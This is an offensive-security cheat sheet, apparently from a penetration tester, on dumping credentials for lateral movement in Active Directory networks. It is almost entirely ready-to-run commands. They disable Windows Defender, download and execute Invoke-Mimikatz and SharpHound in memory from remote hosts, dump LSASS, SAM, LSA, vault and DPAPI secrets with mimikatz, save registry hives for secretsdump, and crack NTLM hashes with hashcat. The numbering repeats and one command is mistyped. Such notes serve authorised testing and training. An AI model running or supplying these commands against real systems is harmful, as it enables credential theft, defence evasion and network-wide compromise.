# Lateral Movement Methodology

### 1) Credentials Dumping and Testing

If we get System/Admin level privileges on the machine, we can dump credentials from the machine to use them for lateral movement on other machines within a network.

This applies mostly to AD networks.

1) Disable Antivirus

        Set-MpPreference -DisableRealtimeMonitoring $True

2) Download mimikatz to target machine. You can use either the Invoke-Mimikatz powershell module, or the executable.

Execute a file in memory using powershell

      IEX (New-Object Net.WebClient).DownloadString('https://<snip>/Invoke-Mimikatz.ps1')

Download executable

      "IEX(New-Object Net.WebClient).downloadString('http://172.16.5.222/SharpHound.exe')"	

3) Run mimikatz

        .\mimikatz.exe

        privilege::debug

4) Dump LSASS

        sekurlsa::logonpasswords

5) Dump SAM

        lsadump::sam

6) Dump LSA

        lsadump::lsa

7) Windows Vault stored credentials (passwords and auth tokens)

        vault:cred 

8) Web Credentials

        vault::list 

9) Altering LSASS Logic (Prevent LSASS from checking the credential type so we can dump netowrk share credentials, RDP passwords, etc)

        sekurlsa::patch

10) Extract Credentials with DPAPI

        dpapi::cred /in:"%appdata%\Microsoft\Credentials\235BN34JIK5B34IJB345KJN"

Extract the masterkey

        dpapi::masterkey /in:"%appdata%\Microsoft\Protect\S-1-5-21-2532523532532-4234645645-35435634634-1104\cc6ehbf-2871-4afb-adf2-223gferf23"

Using RPC for domain controllers

        dpapi::masterkey /in:"%appdata%\Microsoft\Protect\S-1-5-21-2532523532532-4234645645-35435634634-1104\cc6ehbf-2871-4afb-adf2-223gferf23" /rpc


Final decryption

        dpapi::cred /in:"%appdata%\Microsoft\Credentials\235BN34JIK5B34IJB345KJN"


9) Collect cleartext/ntlm credentials and test them on different machines in the network using different protocols like smb, winrm and rdp for example using netexec

10) SAM Registry Keys

        reg.exe save hklm\sam C:\sam.save

        reg.exe save hklm\system C:\system.save

        reg.exe save hklm\security C:\security.save

Then on Kali machine:

        secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

Then crack dumped NTLM hashes with hashcat or do a Pass-the-Hash attack

         sudo hashcat -m 1000 ntlm_hash.txt /usr/share/wordlists/rockyou.txt
